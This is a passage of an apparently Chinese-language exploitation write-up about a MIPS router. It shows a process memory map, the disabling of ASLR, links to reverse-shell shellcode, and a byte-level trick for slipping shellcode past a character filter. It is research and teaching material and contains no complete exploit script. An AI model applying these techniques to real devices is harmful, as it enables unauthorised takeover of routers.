+0x77e05000 0x77e46000 0x00000000 rw-
+0x77e46000 0x77ea3000 0x00000000 r-x /lib/libuClibc-0.9.30.so
+0x77ea3000 0x77eb2000 0x00000000 ---
+0x77eb2000 0x77eb3000 0x0005c000 r-- /lib/libuClibc-0.9.30.so
+0x77eb3000 0x77eb4000 0x0005d000 rw- /lib/libuClibc-0.9.30.so
+0x77eb4000 0x77eb9000 0x00000000 rw-
+0x77eb9000 0x77ee3000 0x00000000 r-x /lib/libgcc_s.so.1
+0x77ee3000 0x77ef3000 0x00000000 ---
+0x77ef3000 0x77ef4000 0x0002a000 rw- /lib/libgcc_s.so.1
+0x77ef4000 0x77ef6000 0x00000000 r-x /lib/libwpa_ctrl.so
+0x77ef6000 0x77f05000 0x00000000 ---
+0x77f05000 0x77f06000 0x00001000 rw- /lib/libwpa_ctrl.so
+0x77f06000 0x77f07000 0x00000000 r-x /lib/libutil.so.0
+0x77f07000 0x77f16000 0x00000000 ---
+0x77f16000 0x77f17000 0x00000000 rw- /lib/libutil.so.0
+0x77f17000 0x77f18000 0x00000000 r-x /lib/libmsglog.so
+0x77f18000 0x77f27000 0x00000000 ---
+0x77f27000 0x77f28000 0x00000000 rw- /lib/libmsglog.so
+0x77f28000 0x77f29000 0x00000000 r-x /lib/librt.so.0
+0x77f29000 0x77f38000 0x00000000 ---
+0x77f38000 0x77f39000 0x00000000 rw- /lib/librt.so.0
+0x77f39000 0x77f96000 0x00000000 r-x /lib/libc.so.0
+0x77f96000 0x77fa5000 0x00000000 ---
+0x77fa5000 0x77fa6000 0x0005c000 r-- /lib/libc.so.0
+0x77fa6000 0x77fa7000 0x0005d000 rw- /lib/libc.so.0
+0x77fa7000 0x77fac000 0x00000000 rw-
+0x77fac000 0x77fb9000 0x00000000 r-x /lib/libpthread.so.0
+0x77fb9000 0x77fc8000 0x00000000 ---
+0x77fc8000 0x77fc9000 0x0000c000 r-- /lib/libpthread.so.0
+0x77fc9000 0x77fce000 0x0000d000 rw- /lib/libpthread.so.0
+0x77fce000 0x77fd0000 0x00000000 rw-
+0x77fd0000 0x77fd1000 0x00000000 r-x /hook_mips
+0x77fd1000 0x77fe0000 0x00000000 ---
+0x77fe0000 0x77fe1000 0x00000000 r-- /hook_mips
+0x77fe1000 0x77fe2000 0x00001000 rw- /hook_mips
+0x77fe2000 0x77fe7000 0x00000000 r-x /lib/ld-uClibc.so.0
+0x77ff1000 0x77ff5000 0x00000000 rw- /SYSV0000002f <span class="o">(</span>deleted<span class="o">)</span>
+0x77ff5000 0x77ff6000 0x00000000 rw-
+0x77ff6000 0x77ff7000 0x00004000 r-- /lib/ld-uClibc.so.0
+0x77ff7000 0x77ff8000 0x00005000 rw- /lib/ld-uClibc.so.0
+0x7d7fd000 0x7d800000 0x00000000 rwx
+0x7d9fd000 0x7da00000 0x00000000 rwx
+0x7dbfd000 0x7dc00000 0x00000000 rwx
+0x7ddfd000 0x7de00000 0x00000000 rwx
+0x7dffd000 0x7e000000 0x00000000 rwx
+0x7e1fd000 0x7e200000 0x00000000 rwx
+0x7e3fd000 0x7e400000 0x00000000 rwx
+0x7e5fd000 0x7e600000 0x00000000 rwx
+0x7e7fd000 0x7e800000 0x00000000 rwx
+0x7e9fd000 0x7ea00000 0x00000000 rwx
+0x7ebfd000 0x7ec00000 0x00000000 rwx
+0x7edfd000 0x7ee00000 0x00000000 rwx
+0x7effd000 0x7f000000 0x00000000 rwx
+0x7f1fd000 0x7f200000 0x00000000 rwx
+0x7f3fd000 0x7f400000 0x00000000 rwx
+0x7f5fd000 0x7f600000 0x00000000 rwx
+0x7f7fd000 0x7f800000 0x00000000 rwx
+0x7ffd6000 0x7fff7000 0x00000000 rwx <span class="o">[</span>stack<span class="o">]</span>
+0x7fff7000 0x7fff8000 0x00000000 r-x <span class="o">[</span>vdso<span class="o">]</span>
+</code></pre></div>
+在 gdb 调试器中找到libc的基地址，这里主要使用libc.so库来查找rop。</p>
+<ul>
+<li>关于 ROP 链的构造，网上的文章也比较多了，在此不在赘述，这里可以主要参考<a href="https://www.anquanke.com/post/id/179510">这篇文章</a></li>
+</ul>
+<p>总结起来就是一张图：</p>
+<p><img alt="" src="http://static.zybuluo.com/H4l0/9aqefz9pm94i2skjf0r27rpr/image.png" /></p>
+<p>模拟器内核可能开启了ALSR，方便演示先关闭保护机制：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">sudo</span> <span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="s">&quot;echo &#39;0&#39; &gt; /proc/sys/kernel/randomize_va_space&quot;</span>
+</code></pre></div>
+
+<h3 id="shellcode">shellcode 查找/构造<a class="headerlink" href="#shellcode" title="Permanent link">&para;</a></h3>
+<p>贴出两个查找shellcode网站</p>
+<p><a href="http://shell-storm.org/shellcode/files/shellcode-794.php">http://shell-storm.org/shellcode/files/shellcode-794.php</a>
+<a href="https://www.exploit-db.com/exploits/45541">https://www.exploit-db.com/exploits/45541</a></p>
+<p>直接使用现成的反弹 shell 的 shellcode 发现行不通，原因是程序中对数据有过滤，需要对shellcode修改。</p>
+<ul>
+<li>对 shellcode 的修改方法主要有两种：</li>
+</ul>
+<p>1、同指令替换。
+2、进行简单编码。</p>
+<p>这里采用指令替换的方法，针对于 <code>lui</code> 指令的字节码为 0x3c（/）的情况下，使用一些无关指令，如填充<code>ori t3,t3,0xff3c</code>指令时，3c 会被编码成 5c3c，那么这时候3c就逃逸到下一个内存空间中，这个 3c 就可以继续使用了（针对于开头为 3c 的汇编指令）。</p>
+<p>过程总结如下：</p>
+<p><div class="codehilite"><pre><span></span><code><span class="mf">1.</span> <span class="err">选择一个无用的寄存器</span> <span class="n">t3</span><span class="err">，填充</span> <span class="n">ori</span> <span class="err">$</span><span class="n">t3</span><span class="p">,</span> <span class="err">$</span><span class="n">t3</span><span class="p">,</span> <span class="mh">0xff3c</span><span class="err">。对应的汇编字节码为</span> <span class="s">&quot;</span><span class="se">\x35\x6b\xff\x3c</span><span class="s">&quot;</span>
+<span class="mf">2.</span> <span class="err">结尾的</span> <span class="err">\</span><span class="n">x3c</span> <span class="err">会转义为</span> <span class="err">\</span><span class="n">x5c</span><span class="err">\</span><span class="n">x3c</span><span class="err">，\</span><span class="n">x3c</span> <span class="err">就会逃逸到下一个内存空间中</span>
+<span class="mf">3.</span> <span class="err">在下一个内存空间中，如果我们需要填充</span> <span class="s">&quot;\ x3c \ x0f \ x2f \ x2f&quot;</span> <span class="c1">//lui $ t7, 0x2f2f  这个语句的话，只需填充 \ x0f \ x2f \ x2f 即可，这样我们就达到了类似指令替换的目的</span>
+<span class="mf">4.</span> <span class="err">对于其他被转义的字符也可以类似的操作。</span>
+</code></pre></div>
+- 对指令进行反汇编时，可以借助 pwntools 的 disasm 模块</p>
+<p><div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">disasm</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x01\xe0\x20\x27</span><span class="s2">&quot;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&quot;mips&quot;</span><span class="p">,</span><span class="n">endian</span><span class="o">=</span><span class="s2">&quot;big&quot;</span><span class="p">,</span><span class="nb">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span>
+</code></pre></div>
+这样我们将 shellcode 进行简单的修改之后，就可以成功获取路由器的权限。</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20200413134753757.png" /></p>
+<ul>
+<li>视频参考：</li>
+</ul>
+<p><a href="https://twitter.com/H4looo/status/1248924966256427011">https://twitter.com/H4looo/status/1248924966256427011</a></p>
+<h2 id="_1">参考文章<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><a href="https://ktln2.org/2020/03/29/exploiting-mips-router/">https://ktln2.org/2020/03/29/exploiting-mips-router/</a></p>
+                
+                  
+                
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2020 HatLab Team
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org" target="_blank" rel="noopener">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs</a>
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../assets/fonts/font-awesome.css">
+    
+      <a href="https://github.com/DasSecurity-Labs" target="_blank" rel="noopener" title="github" class="md-footer-social__link fa fa-github"></a>
+    
+      <a href="https://twitter.com/H4looo" target="_blank" rel="noopener" title="twitter" class="md-footer-social__link fa fa-twitter"></a>
+    
+      <a href="https://www.linkedin.com/" target="_blank" rel="noopener" title="linkedin" class="md-footer-social__link fa fa-linkedin"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../assets/javascripts/application.c33a9706.js"></script>
+      
+        
+        
+          
+          <script src="../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../assets/javascripts/lunr/lunr.ja.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.1",url:{base:".."}})</script>
+      
+    
+  </body>
+</html>
